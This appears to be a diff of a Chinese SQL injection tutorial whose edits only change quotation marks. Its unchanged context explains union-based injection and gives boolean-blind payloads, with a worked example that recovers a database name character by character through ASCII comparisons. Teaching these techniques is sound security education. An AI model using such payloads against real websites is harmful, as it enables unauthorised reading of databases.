@@ -1783,7 +1783,7 @@ SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）�
 2. SQL 注入分类常见的注入点：
 ?str=xxx?test=xxx?idstr=xxx?id=xxx
 
-2.1 union 注入2.1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
+2.1 union 注入2.1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会”纵向”拼接两个或多个 SELECT 语句的结果.
 2.1.2 适用条件：（1）网页存在注入点，有回显。
 （2）需要满足union语句要求，即：
 union前后两个select的结果集应具有相同列数；
@@ -1958,7 +1958,7 @@ b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
 
 
 数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
-?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
+?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，&quot;第几位&quot;，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
 
 示例（库名：data）：
 ?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
